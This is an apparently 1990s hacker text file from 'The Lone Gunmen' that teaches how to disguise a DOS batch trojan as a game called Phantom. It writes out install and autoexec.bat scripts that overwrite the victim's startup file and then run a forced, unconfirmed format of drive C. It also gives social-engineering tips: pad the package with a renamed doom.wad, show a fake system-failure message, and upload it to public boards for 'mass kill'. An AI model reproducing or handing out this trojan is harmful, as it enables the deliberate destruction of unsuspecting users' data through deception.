@@ -1,0 +1,122 @@
+                 ______________  
+                |  ___    ___  |                        
+                | |_  |  |  _| |  ______           ______          
+                |___| |  | |___| |_    _|        /        \
+                      |  |         |  |         |   /----\/
+                      |  |         |  |         |  | 
+                      |  |         |  |         |  |    ___                 
+                      |  |         |  |  __     |  |   <_  | Issue #:017     
+                     _|  |_       _|  |_|  |    |   \___/  | Date:09\21\95         
+                    |______|  () |_________| ()  \________/ ()               
+                     _ / /                            \ \ _                      
+                   / _ /     THE LONE GUNMEN Presents:  \ _ \                
+                  | |                                      | |              
+                  | | How To fuck Over a Lammers Hard Drive| |               
+                  | |          Written By: Falcon          | |               
+                  | |                                      | |            
+                  | |                                      | |     
+                  |  \____________________________________/  |
+                   \________________________________________/
+                  
+
+
+
+********************************STOP******************************************
+*** In this day and age, anyone can get there hands on txt philez and that ***
+*** means that even the YuppIe kids, who don't follow directions, can (and ***
+*** will probly blow there faces,hands,fingers,noses,legs,nipples, and P-P ***
+*** blown off, so befor you continue read the File "DISCLAIM.ER!" that was ***
+*** included in the .ZIP file. it basicly says that you cant sew me if you ***
+*** get fucked. **************************************************************
+******************************************************************************
+
+
+
+
+Well, here is a nifty way to format a lamers HD just by using a batch file(yes
+a batch file and dos format command...read on to see how), and even more 
+important, how to get the guy to run the program. 
+
+I know this is a round about way to get the job accomplished, It will get 
+them exicted and then let them down bigtime! 
+
+The best way to get people to run your batch file is 1) make it a .com file
+and 2) make it look like a really kick ass game. To give it some size(no one 
+is gonna believe that a 1000 byte file is a cool game) copy a file such
+as the shareware doom.wad to a different name...say phantom.dat, and put some
+.voc or .wav files with it just to make it look better.
+
+-----------------------------------------------------------------------------
+Now heres the install file:
+
+1: @echo off
+2: copy *.* c:\
+3: c:
+4: cd \
+5: md phantom
+6: copy *.* c:\phantom
+7: cd \phantom
+8: Echo ~Type Phantom to Play~
+
+Here's what each line does...
+
+1: If you don't know what this does go fuck a duck!
+2: Copy all the files from where ever he unzipped them to the root directory;
+        -This serves 2 purposes...
+                1) Make the hard disk spin and seem like its doing something
+                2) replace his autoexec.bat with his new improved one.
+3: make sure you're on the c drive
+4: makes the "games" directory
+6: again only to make the hard disk spin.
+7: change to the "games" directory.
+8: TElls the user what to type to run the game.
+
+-----------------------------------------------------------------------------
+Here's The main program.
+
+1: Echo System Failure! PLease reboot to Re-Allocate the HD.
+2: pause
+
+okay...
+
+1: Tells the user to reboot...which will run the new autoexec.bat file.
+      **Anything can be put in number 1...just choose something real stupid
+        to use here.**
+2: Waits for key press to bring him back to the prompt.
+
+------------------------------------------------------------------------------
+And here's the autoexec.bat:
+
+1: @echo off
+2: Echo Y|format c:
+3: echo ~~SYSTEM FAILURE! NO START UP FILES FOUND!~~
+
+what they do:
+
+1: duh!
+2: This is the key to the program...it uses the dos format command but doesn't
+   ask for a yes/no answer!
+        *It will however Show the thing that asks it with a Y in the answer
+        spot...But hopefully he will not notice it till its to late.*
+3: Oops...did you do that...:)
+
+------------------------------------------------------------------------------ 
+
+Just remeber to make the files .com(I've got the utilz to do it one airways)
+...and that people that have any common sence will realise what is going
+on with this when they see the allocate thing...part of the reason why I
+put it there...if they are smart enough to notice it most likely you could
+think up something better for them. If they are to stupid to notice
+such a Bull Shit statement they deserve to lose their HD.
+
+
+Remember, it's not cool to do this to a friends computer, or upload such 
+a program to my board...but any PD board is fine(Mass kill).
+Oh yeah...its illegal to fuck with other peoples computers too...Just to 
+warn you.
+
+
+
+
+
+
